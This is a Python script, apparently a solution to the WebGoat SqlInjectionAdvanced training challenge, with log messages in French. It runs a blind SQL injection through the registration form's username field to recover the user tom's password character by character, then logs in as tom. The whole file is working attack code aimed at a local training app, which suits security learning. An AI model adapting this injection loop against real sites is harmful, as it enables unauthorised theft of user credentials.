import string
import requests
import json
import sys
import logging 

def send_request(url, username_reg, proxy=None, auth_cookie=None):
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    if auth_cookie:
        headers['Cookie'] = auth_cookie
    data = {
        'username_reg': username_reg,
        'email_reg': 'test@test.fr',
        'password_reg': 'test',
        'confirm_password_reg': 'test'
    }
    if proxy:
        proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }
        response = requests.put(url, headers=headers, data=data, proxies=proxies)
    else:
        response = requests.put(url, headers=headers, data=data)
    return response.text

def run_script(url, cookie, proxy='127.0.0.1:8081'):

    proxy = proxy
    auth_cookie = cookie

    password = ''
    chall_solved=False
    password_found = False
    logging.info('[*] Recherche du mot de passe de tom : ')
    for depth in range(25):
        if password_found:
            break
        for char in string.ascii_letters + string.digits:
            username_reg = f"tom' AND substring(password,{depth + 1},1)='{char}"
            response = send_request(url, username_reg, proxy, auth_cookie)
            response_json = json.loads(response)
            if 'already exists' in response:
                password += char
                sys.stdout.write(char)
                sys.stdout.flush()
                break
            elif response_json["lessonCompleted"] == True:
                chall_solved = True
            elif response_json["output"] == 'Something went wrong':
                password_found=True
                break
                
    if password:
        logging.info(f'\n[*] Mot de passe trouvé : {password}')
        burp0_url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/challenge_Login"
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        headers['Cookie'] = auth_cookie
        burp0_cookies = auth_cookie
        burp0_data = {"username_login": "tom", "password_login": password}
        requests.post(burp0_url, headers=headers, data=burp0_data)
        
    else:
        logging.info('Password not found')
    if chall_solved:
        logging.info('[*] Challenge SQL_advanced validé\n')
